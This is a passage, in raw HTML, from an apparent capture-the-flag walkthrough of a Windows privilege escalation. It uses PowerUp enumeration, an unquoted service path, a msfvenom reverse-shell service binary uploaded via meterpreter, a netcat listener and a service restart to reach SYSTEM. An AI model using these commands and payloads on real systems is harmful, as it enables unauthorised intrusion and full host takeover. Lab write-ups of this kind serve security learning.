</span></span><span style=display:flex><span><span style=color:#f92672>-</span>a<span style=color:#f92672>---</span>         <span style=color:#ae81ff>2</span><span style=color:#f92672>/</span><span style=color:#ae81ff>16</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2014</span>  <span style=color:#ae81ff>12</span>:<span style=color:#ae81ff>58</span> PM     <span style=color:#ae81ff>760320</span> hfs<span style=color:#f92672>.</span>exe
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>a<span style=color:#f92672>---</span>         <span style=color:#ae81ff>5</span><span style=color:#f92672>/</span><span style=color:#ae81ff>23</span><span style=color:#f92672>/</span><span style=color:#ae81ff>2024</span>   <span style=color:#ae81ff>8</span>:<span style=color:#ae81ff>19</span> PM     <span style=color:#ae81ff>494860</span> powerup<span style=color:#f92672>.</span>ps1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS <span style=color:#f92672>&gt;</span> 
</span></span></code></pre></div><p>Load the powershell module and use powershell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>load powershell
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>powershell_shell
</span></span></code></pre></div><p>Run the script PowerUp.ps1 that we just downloaded into the target and run it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>. .<span style=color:#ae81ff>\p</span>owerup.ps1
</span></span></code></pre></div><p>We will now run all the checks in this module using the following command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Invoke-AllChecks
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>PS &gt; . .<span style=color:#ae81ff>\p</span>owerup.ps1
</span></span><span style=display:flex><span>PS &gt; Invoke-AllChecks
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Running Invoke-AllChecks
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Checking <span style=color:#66d9ef>if</span> user is in a local group with administrative privileges...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Checking <span style=color:#66d9ef>for</span> unquoted service paths...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServiceName   : AdvancedSystemCareService9
</span></span><span style=display:flex><span>Path          : C:<span style=color:#ae81ff>\P</span>rogram Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span><span style=color:#ae81ff>\I</span>Obit<span style=color:#ae81ff>\A</span>dvanced SystemCare<span style=color:#ae81ff>\A</span>SCService.exe
</span></span><span style=display:flex><span>StartName     : LocalSystem
</span></span><span style=display:flex><span>AbuseFunction : Write-ServiceBinary -ServiceName <span style=color:#e6db74>&#39;AdvancedSystemCareService9&#39;</span> -Path &lt;HijackPath&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServiceName   : AWSLiteAgent
</span></span><span style=display:flex><span>Path          : C:<span style=color:#ae81ff>\P</span>rogram Files<span style=color:#ae81ff>\A</span>mazon<span style=color:#ae81ff>\X</span>enTools<span style=color:#ae81ff>\L</span>iteAgent.exe
</span></span><span style=display:flex><span>StartName     : LocalSystem
</span></span><span style=display:flex><span>AbuseFunction : Write-ServiceBinary -ServiceName <span style=color:#e6db74>&#39;AWSLiteAgent&#39;</span> -Path &lt;HijackPath&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServiceName   : IObitUnSvr
</span></span><span style=display:flex><span>Path          : C:<span style=color:#ae81ff>\P</span>rogram Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span><span style=color:#ae81ff>\I</span>Obit<span style=color:#ae81ff>\I</span>Obit Uninstaller<span style=color:#ae81ff>\I</span>UService.exe
</span></span><span style=display:flex><span>StartName     : LocalSystem
</span></span><span style=display:flex><span>AbuseFunction : Write-ServiceBinary -ServiceName <span style=color:#e6db74>&#39;IObitUnSvr&#39;</span> -Path &lt;HijackPath&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServiceName   : LiveUpdateSvc
</span></span><span style=display:flex><span>Path          : C:<span style=color:#ae81ff>\P</span>rogram Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span><span style=color:#ae81ff>\I</span>Obit<span style=color:#ae81ff>\L</span>iveUpdate<span style=color:#ae81ff>\L</span>iveUpdate.exe
</span></span><span style=display:flex><span>StartName     : LocalSystem
</span></span><span style=display:flex><span>AbuseFunction : Write-ServiceBinary -ServiceName <span style=color:#e6db74>&#39;LiveUpdateSvc&#39;</span> -Path &lt;HijackPath&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Checking service executable and argument permissions...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServiceName    : IObitUnSvr
</span></span><span style=display:flex><span>Path           : C:<span style=color:#ae81ff>\P</span>rogram Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span><span style=color:#ae81ff>\I</span>Obit<span style=color:#ae81ff>\I</span>Obit Uninstaller<span style=color:#ae81ff>\I</span>UService.exe
</span></span><span style=display:flex><span>ModifiableFile : C:<span style=color:#ae81ff>\P</span>rogram Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span><span style=color:#ae81ff>\I</span>Obit<span style=color:#ae81ff>\I</span>Obit Uninstaller<span style=color:#ae81ff>\I</span>UService.exe
</span></span><span style=display:flex><span>StartName      : LocalSystem
</span></span><span style=display:flex><span>AbuseFunction  : Install-ServiceBinary -ServiceName <span style=color:#e6db74>&#39;IObitUnSvr&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Checking service permissions...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Checking %PATH% <span style=color:#66d9ef>for</span> potentially hijackable .dll locations...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HijackablePath : C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>AbuseFunction  : Write-HijackDll -OutputFile <span style=color:#e6db74>&#39;C:\Windows\system32\\wlbsctrl.dll&#39;</span> -Command <span style=color:#e6db74>&#39;...&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HijackablePath : C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>AbuseFunction  : Write-HijackDll -OutputFile <span style=color:#e6db74>&#39;C:\Windows\\wlbsctrl.dll&#39;</span> -Command <span style=color:#e6db74>&#39;...&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>HijackablePath : C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\W</span>indowsPowerShell<span style=color:#ae81ff>\v</span>1.0<span style=color:#ae81ff>\
</span></span></span><span style=display:flex><span><span style=color:#ae81ff></span>AbuseFunction  : Write-HijackDll -OutputFile <span style=color:#e6db74>&#39;C:\Windows\System32\WindowsPowerShell\v1.0\\wlbsctrl.dll&#39;</span> -Command <span style=color:#e6db74>&#39;...&#39;</span>
</span></span></code></pre></div><p>When we run the command, we can see that there is a unquoted service path vulnerability as we can see it in the checks. More information on unquoted service path vulnerability can be found <a href=https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/>here.</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>‚ùØ</span> msfvenom <span style=color:#f92672>-</span>p windows<span style=color:#f92672>/</span>shell_reverse_tcp LHOST<span style=color:#f92672>=</span><span style=color:#ae81ff>10.10.70.179</span> LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4443</span> <span style=color:#f92672>-</span>e x86<span style=color:#f92672>/</span>shikata_ga_nai <span style=color:#f92672>-</span>f exe<span style=color:#f92672>-</span>service <span style=color:#f92672>-</span>o Advanced<span style=color:#f92672>.</span>exe
</span></span><span style=display:flex><span>[<span style=color:#f92672>-</span>] No platform was selected, choosing Msf::Module::Platform::Windows <span style=color:#f92672>from</span> the payload
</span></span><span style=display:flex><span>[<span style=color:#f92672>-</span>] No arch selected, selecting arch: x86 <span style=color:#f92672>from</span> the payload
</span></span><span style=display:flex><span>Found <span style=color:#ae81ff>1</span> compatible encoders
</span></span><span style=display:flex><span>Attempting to encode payload <span style=color:#66d9ef>with</span> <span style=color:#ae81ff>1</span> iterations of x86<span style=color:#f92672>/</span>shikata_ga_nai
</span></span><span style=display:flex><span>x86<span style=color:#f92672>/</span>shikata_ga_nai succeeded <span style=color:#66d9ef>with</span> size <span style=color:#ae81ff>351</span> (iteration<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>x86<span style=color:#f92672>/</span>shikata_ga_nai chosen <span style=color:#66d9ef>with</span> final size <span style=color:#ae81ff>351</span>
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>351</span> bytes
</span></span><span style=display:flex><span>Final size of exe<span style=color:#f92672>-</span>service file: <span style=color:#ae81ff>15872</span> bytes
</span></span><span style=display:flex><span>Saved <span style=color:#66d9ef>as</span>: Advanced<span style=color:#f92672>.</span>exe
</span></span></code></pre></div><p>For the service AdvancedSystemCareService9, the CanRestart option is set to true which means that the service can be restarted. We will now create a malicious file and upload it in the IObit folder and then restart the service to get the reverse shell. The file name is set to Advanced because we are uploading the file into the path where the Advanced SystemCare folder is present as we know there is an unquoted service path vulnerability. Since the service AdvancedSystemCareService9 is running as system32, we will be getting a reverse shell as system32.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>msfvenom -p windows/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.2.217 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4443</span> -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
</span></span></code></pre></div><p>Exit the powershell. Using the earlier meterpreter reverse shell, change directory to the path IObit and then upload the malicious file that we created.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>upload Advanced.exe
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>meterpreter &gt; ls
</span></span><span style=display:flex><span>Listing: C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\b</span>ill<span style=color:#ae81ff>\A</span>ppData<span style=color:#ae81ff>\R</span>oaming<span style=color:#ae81ff>\M</span>icrosoft<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>tart Menu<span style=color:#ae81ff>\P</span>rograms<span style=color:#ae81ff>\S</span>tartup
</span></span><span style=display:flex><span><span style=color:#f92672>====================================================================================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Mode              Size    Type  Last modified              Name
</span></span><span style=display:flex><span>----              ----    ----  -------------              ----
</span></span><span style=display:flex><span>040777/rwxrwxrwx  <span style=color:#ae81ff>0</span>       dir   2024-05-23 23:26:39 -0400  %TEMP%
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>15872</span>   fil   2024-05-23 23:27:14 -0400  Advanced.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>10178</span>   fil   2024-05-23 23:23:18 -0400  Invoke-AllChecks
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>174</span>     fil   2019-09-27 07:07:07 -0400  desktop.ini
</span></span><span style=display:flex><span>100777/rwxrwxrwx  <span style=color:#ae81ff>760320</span>  fil   2014-02-16 15:58:52 -0500  hfs.exe
</span></span><span style=display:flex><span>100666/rw-rw-rw-  <span style=color:#ae81ff>494860</span>  fil   2024-05-23 23:19:57 -0400  powerup.ps1
</span></span></code></pre></div><p>Open another terminal and use netcat listener on port 4443 to get the reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc -lnvp <span style=color:#ae81ff>4443</span>
</span></span></code></pre></div><p>Now, load the command prompt shell using the command in the meterpreter shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>shell
</span></span></code></pre></div><p>Restart the AdvancedSystemCareService9 service by using the following commands.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sc stop AdvancedSystemCareService9
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sc start AdvancedSystemCareService9
</span></span></code></pre></div><p>Now we get a reverse shell in the other terminal window running as system32!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>‚ùØ nc -lnvp <span style=color:#ae81ff>4443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.6.29.149<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.70.179<span style=color:#f92672>]</span> <span style=color:#ae81ff>49343</span>
</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 6.3.9600<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2013</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>C: <span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;
</span></span></code></pre></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></aside></main></body></html>